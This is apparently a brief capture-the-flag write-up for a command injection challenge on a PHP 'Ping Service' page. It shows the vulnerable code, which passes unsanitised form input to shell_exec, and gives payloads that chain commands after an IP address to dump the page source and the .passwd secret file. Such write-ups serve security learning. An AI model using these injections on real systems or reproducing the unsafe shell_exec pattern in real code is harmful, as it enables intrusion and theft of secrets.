Payload: `127.0.0.1;ls;cat index.php | base64` return the source code of the index.php file
```php
<html>
<head>
<title>Ping Service</title>
</head>
<body>
<form method="POST" action="index.php">
        <input type="text" name="ip" placeholder="127.0.0.1">
        <input type="submit">
</form>
<pre>
<?php 
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?>
</pre>
</body>
</html>
```
To get the validation string, I use this payload: `127.0.0.1;ls;cat .passwd | base64`